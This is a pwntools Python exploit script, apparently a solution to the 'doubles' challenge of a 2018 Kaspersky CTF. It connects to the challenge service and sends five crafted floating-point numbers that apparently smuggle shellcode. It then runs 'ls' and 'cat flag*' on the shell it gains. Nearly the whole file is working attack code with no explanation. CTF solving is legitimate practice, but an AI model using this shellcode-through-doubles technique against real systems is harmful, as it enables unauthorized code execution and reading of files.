#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('doubles')

host = args.HOST or 'doubles.2018.ctf.kaspersky.com'
port = int(args.PORT or 10001)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.sendlineafter('n:', '5')
io.sendline('3.442867560398180362139408815180828404668118237902716819515387001926604155032327697710172537159501919173500510374494858836960033e-271')
io.sendline('4.879975942497918426564862121009476378747645355665251297922952767431153410281315876317576197823020218102893510323033320130678471e-288')
io.sendline('3.244107503427055810094473414114691119768530032283184934174611137632195638515837763748903089255826232881626426092055693037994787e-310')
io.sendline('3.244107181606972606271286562624482283523019671344579739499013576497581483800081850095031157128419992182792270072349571144352639e-310')
io.sendline('-3.414613991459418005655505535104329401910071639909620338868514123461140696572413335294460839054361644519631342099422254887952526e-228')

io.sendline('ls')
print (io.recv())
print (io.recv())
io.sendline('cat flag*')
print (io.recv())
